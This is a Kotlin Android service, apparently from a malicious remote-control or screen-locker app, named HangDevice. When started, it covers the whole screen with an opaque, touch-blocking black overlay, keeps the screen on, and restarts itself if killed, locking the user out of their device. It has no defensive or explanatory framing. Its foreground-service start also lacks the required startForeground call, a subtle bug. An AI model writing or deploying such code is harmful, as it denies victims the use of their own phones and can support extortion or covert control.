package com.app.cyber

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.WindowManager
import android.widget.FrameLayout

class HangDevice : Service() {

    private var wm: WindowManager? = null
    private var overlay: FrameLayout? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (overlay == null) {
            showOverlay()
        }
        return START_STICKY
    }

    private fun showOverlay() {
        wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        overlay = FrameLayout(this)
        overlay?.setBackgroundColor(Color.BLACK)
        
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
        }
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.OPAQUE
        )
        
        params.gravity = Gravity.TOP or Gravity.LEFT
        wm?.addView(overlay, params)
    }

    override fun onDestroy() {
        try {
            overlay?.let { wm?.removeView(it) }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context) {
            val intent = Intent(ctx, HangDevice::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent)
            } else {
                ctx.startService(intent)
            }
        }
        
        fun stop(ctx: Context) {
            ctx.stopService(Intent(ctx, HangDevice::class.java))
        }
    }
}
